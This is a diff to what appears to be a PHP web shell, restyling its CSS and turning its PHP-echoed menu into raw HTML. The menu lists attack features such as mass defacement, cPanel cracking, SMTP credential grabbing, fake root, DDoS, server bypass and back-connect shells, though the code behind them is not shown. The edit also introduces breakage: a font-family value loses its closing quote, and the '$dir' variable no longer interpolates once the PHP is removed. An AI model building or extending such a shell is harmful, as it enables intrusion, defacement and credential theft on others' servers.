@@ -112,7 +112,7 @@ option:hover {
     color: #000000;
 }
 .mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid #ff0000; padding:4px 2px;width:70%;line-height:24px;background:none;box-shadow: 0px 4px 2px white;-webkit-box-shadow: 0px 4px 2px #ff0000;-moz-box-shadow: 0px 4px 2px #ff0000;}
-.cgx2 {text-align: center;letter-spacing:1px;font-family: "orbitron";color: #ff0000;font-size:25px;text-shadow: 5px 5px 5px black;}
+.cgx2 {text-align: center;letter-spacing:1px;font-family: "orbitroncolor: #ff0000;font-size:25px;text-shadow: 5px 5px 5px black;}
 .infoweb {
     border-right: 1px solid #00FFFF;
 }
@@ -243,43 +243,42 @@ option:hover {
     transform: skewX(0);
   }
 }
-</style>
+</style></head>
 <?php
-echo "<li> <a href='?'>Home</a> </li>";
-echo "<a style='color: red;' href='?dir=$dir&do=infosys'>Info Website</a> </li>";
-echo "<li> <a href='?dir=$dir&do=upload'>Upload</a> </li>";
-echo "<li> <a href='?do=symlink'>symlink</a> </li>";
-echo "<li> <a href='?do=config'>Config</a> </li>";
-echo "<li> <a href='?do=jumping'>Jumping</a> </li>";
-echo "<li> <a href='?do=mass_delete'>Mass Delete</a> </li>";
-echo "<li> <a href='?do=mass_deface'>Mass Deface</a> </li>";
-echo "<li> <a href='?do=cpanel'>CPanel Crack</a> </li>";
-echo "<li> <a href='?do=smtp'>SMTP Grabber</a> </li>";
-echo "<br><br><li> <a href='?do=fake_root'>Fake Root</a> </li>";
-echo "<li> <a href='?do=auto_edit_user'>Auto Edit User</a> </li>";
-echo "<li> <a href='?do=auto_wp'>Auto Edit Title</a> </li>";
-echo "<li> <a href='?do=zoneh'>Zone-H</a> </li>";
-echo "<li> <a href='?do=auto_dwp'>WordPress Auto Deface</a> </li>";
-echo "<li> <a href='?do=cpftp_auto'>CFTP Auto Deface</a> </li>";
-echo "<li> <a href='?do=krdp_shell'>KRDP Shell</a> </li>";
-echo "<li> <a href='?do=network'>network</a> </li>";
-echo "<li> <a href='?do=about'>about</a> </li>";
-echo "<br><br><li> <a href='?do=adminer'>Adminer</a> </li>";
-echo "<li> <a href='?do=tool'>Tool</a>";
-echo "<li> <a href='?do=admf'>Admin Finder</a> </li>";
-echo "<li> <a href='?do=cmd'>Command</a> </li>";echo "<li> <a href='?dir=$dir&do=autoklik'>Priv Auto Deface</a> </li>";
-echo "<li> <a href='?do=whois'>Whois</a> </li>";
-echo "<li> <a href='?do=cgi'>CGI Telnet</a> </li>";
-echo "<li> <a href='?do=csrf'>CSRF Online</a> </li>";
-echo "<br><br><li> <a href='?do=ddos'>DDos</a> </li>";
-echo "<li> <a href='?do=shellscanner'>Shell Scanner</a> </li>";
-echo "<li> <a href='?do=endeco'>Encode Decode</a> </li>";
-echo "<li> <a href='?xp=bypassserver'>Full bypass</a> </li>";
-echo "<li> <a href='?do=defacerid'>DefacerID</a> </li>";
-echo "<li> <a href='?do=bconnet'>Back Connect</a> </li>";
-echo "<li> <a style='color: red;' href='?logout=true'>Logout</a> </li>";
-echo "<br>";
-echo "<br>";
-echo "<BR>";
-echo "<hr>";
-?>
+<li> <a href='?'>Home</a> </li>
+<a style='color: red;' href='?dir=$dir&do=infosys'>Info Website</a> </li>
+<li> <a href='?dir=$dir&do=upload'>Upload</a> </li>
+<li> <a href='?do=symlink'>symlink</a> </li>
+<li> <a href='?do=config'>Config</a> </li>
+<li> <a href='?do=jumping'>Jumping</a> </li>
+<li> <a href='?do=mass_delete'>Mass Delete</a> </li>
+<li> <a href='?do=mass_deface'>Mass Deface</a> </li>
+<li> <a href='?do=cpanel'>CPanel Crack</a> </li>
+<li> <a href='?do=smtp'>SMTP Grabber</a> </li>
+<br><br><li> <a href='?do=fake_root'>Fake Root</a> </li>
+<li> <a href='?do=auto_edit_user'>Auto Edit User</a> </li>
+<li> <a href='?do=auto_wp'>Auto Edit Title</a> </li>
+<li> <a href='?do=zoneh'>Zone-H</a> </li>
+<li> <a href='?do=auto_dwp'>WordPress Auto Deface</a> </li>
+<li> <a href='?do=cpftp_auto'>CFTP Auto Deface</a> </li>
+<li> <a href='?do=krdp_shell'>KRDP Shell</a> </li>
+<li> <a href='?do=network'>network</a> </li>
+<li> <a href='?do=about'>about</a> </li>
+<br><br><li> <a href='?do=adminer'>Adminer</a> </li>
+<li> <a href='?do=tool'>Tool</a>
+<li> <a href='?do=admf'>Admin Finder</a> </li>
+<li> <a href='?do=cmd'>Command</a> </li><li> <a href='?dir=$dir&do=autoklik'>Priv Auto Deface</a> </li>
+<li> <a href='?do=whois'>Whois</a> </li>
+<li> <a href='?do=cgi'>CGI Telnet</a> </li>
+<li> <a href='?do=csrf'>CSRF Online</a> </li>
+<br><br><li> <a href='?do=ddos'>DDos</a> </li>
+<li> <a href='?do=shellscanner'>Shell Scanner</a> </li>
+<li> <a href='?do=endeco'>Encode Decode</a> </li>
+<li> <a href='?xp=bypassserver'>Full bypass</a> </li>
+<li> <a href='?do=defacerid'>DefacerID</a> </li>
+<li> <a href='?do=bconnet'>Back Connect</a> </li>
+<li> <a style='color: red;' href='?logout=true'>Logout</a> </li>
+<br>
+<br>
+<BR>
+<hr>
